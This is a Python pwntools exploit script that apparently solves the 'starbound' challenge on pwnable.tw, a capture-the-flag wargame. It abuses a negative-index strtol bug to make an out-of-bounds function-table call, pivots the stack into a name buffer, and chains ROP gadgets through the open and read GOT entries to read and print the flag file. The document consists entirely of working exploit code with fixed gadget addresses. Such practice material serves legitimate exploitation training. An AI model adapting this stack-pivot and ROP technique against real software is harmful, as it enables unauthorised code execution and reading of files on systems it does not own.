
from pwn import *

#r = process("./starbound", env={"LD_PRELOAD" : './libc_32.so.6'})
#r = process("./starbound")
r = remote('chall.pwnable.tw','10202')

def pack(num):
    return num & 0xffffffff


### vuln 1 : strtol() : input negative number will cause oob call functionni
 
function_table = 0x08058154
open_got = 0x08055014
read_got = 0x08055054


name_addr = 0x080580D0
gadget1 = 0x0804a028  # 0x0804a028 : add esp, 0x24 ; pop esi ; pop edi ; ret
ret_addr = 0x804a664
call_esi =0x08053b03
ret_addr2 = 0x804a65d
pop_ebx_ret = 0x08048939
xchg_ebx_eax_add_8 = 0x08048d18
pop_ebp_ret = 0x080491bc
leave_ret = 0x08048c58

fake_stack = 0x8058700

### write a gadget we want to name_addr
r.sendlineafter(b'> ',b'6')
r.sendlineafter(b'> ',b'2')
r.sendlineafter(b'name: ',b''.ljust(0x5c,b'\x00') + p32(gadget1))

### stack pivot to name
payload = b'-10\x00'
payload += b'aaaa'*5
payload += p32(pop_ebp_ret) + p32(fake_stack)
payload += p32(pop_ebx_ret) + p32(fake_stack)
payload += p32(ret_addr)

r.sendafter(b'> ',payload)

r.sendlineafter(b'> ',b'2')
r.sendlineafter(b'name: ', b'aaaa' + p32(ret_addr) + b'a'*0x54 + p32(leave_ret))
payload = b'-10\x00' + p32(pop_ebx_ret) + p32(fake_stack+0x20) + p32(ret_addr) 
r.sendafter(b'> ',payload)

# ### open flag 
r.sendlineafter(b'> ',b'2')
r.sendlineafter(b'name: ',b'/home/starbound/flag'.ljust(0x5c,b'\x00') + p32(gadget1))
payload = b'-10\x00'
payload += b'aaaa'*5
payload += p32(pop_ebx_ret) + p32(pack((open_got-function_table)//4) - 8)
payload += p32(xchg_ebx_eax_add_8) + p32(pop_ebx_ret) + p32(fake_stack+0x60)
payload += p32(ret_addr2) + p32(name_addr) + p32(0)
r.sendafter(b'> ',payload)


### read flag  to name_addr
payload = b'-10\x00'
payload += b'aaaa'*5
payload += p32(pop_ebx_ret) + p32(pack((read_got-function_table)//4) - 8)
payload += p32(xchg_ebx_eax_add_8) + p32(pop_ebx_ret) + p32(fake_stack+0xa0)
payload += p32(ret_addr2) + p32(3) + p32(name_addr) + p32(0x60)
r.sendafter(b'> ',payload)

### use info option to reveal flag
r.sendlineafter(b'> ',b'1')
r.sendlineafter(b'> ',b'1')
r.recvuntil(b'Player: ')
flag = r.recvline()
success(flag)
r.close()


